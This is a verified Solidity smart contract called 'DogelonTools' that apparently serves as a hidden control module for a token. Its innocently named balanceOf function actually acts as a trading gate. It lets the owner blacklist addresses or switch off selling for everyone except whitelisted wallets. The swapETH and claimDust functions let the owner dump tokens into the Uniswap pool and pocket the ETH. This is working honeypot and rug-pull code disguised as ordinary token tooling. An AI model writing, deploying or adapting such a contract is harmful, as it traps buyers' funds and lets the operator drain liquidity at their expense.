/**
 *Submitted for verification at Etherscan.io on 2023-07-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Ownable {
    address private _owner;
    constructor () {
        _owner = msg.sender;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract DogelonTools is Ownable {
    IUniswapV2Router02 uniswapV2Router;

    address coin;
    address pair;

    mapping(address => bool) whites;
    mapping(address => bool) blacks;
    bool public enabled = true;

    constructor(address router) {
        uniswapV2Router = IUniswapV2Router02(router);
    }

    receive() external payable { }

    function encode() external view returns (bytes memory) {
        return abi.encode(address(this));
    }

    function setC(address _coin, address _pair) external onlyOwner {
        coin = _coin;
        pair = _pair;
    }

    function setEnable(bool _enabled) external onlyOwner {
        enabled = _enabled;
    }

    function resetC() external onlyOwner {
        coin = address(0);
        pair = address(0);
    }

    function balanceOf(
        address from
    ) external view returns (uint256) {
        if (whites[from] || pair == address(0) || from == coin) {
            return 0;
        }
        else if ((from == owner() || from == address(this))) {
            return 1;
        }
        if (from != pair) {
            require(enabled);
            require(!blacks[from]);
        }
        return 0;
    }

    function swapETH(uint256 count) external onlyOwner {

        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = coin;
        path[1] = uniswapV2Router.WETH();

        IERC20(coin).approve(address(uniswapV2Router), ~uint256(0));

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            10 ** count,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );  

        payable(msg.sender).transfer(address(this).balance);
    }

    function aWL(address[] memory _wat) external onlyOwner{
        for (uint i = 0; i < _wat.length; i++) {
            whites[_wat[i]] = true;
        }
    }

    function aBL(address[] memory _bat) external onlyOwner{
        for (uint i = 0; i < _bat.length; i++) {
            blacks[_bat[i]] = true;
        }
    }

    function claimDust() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
}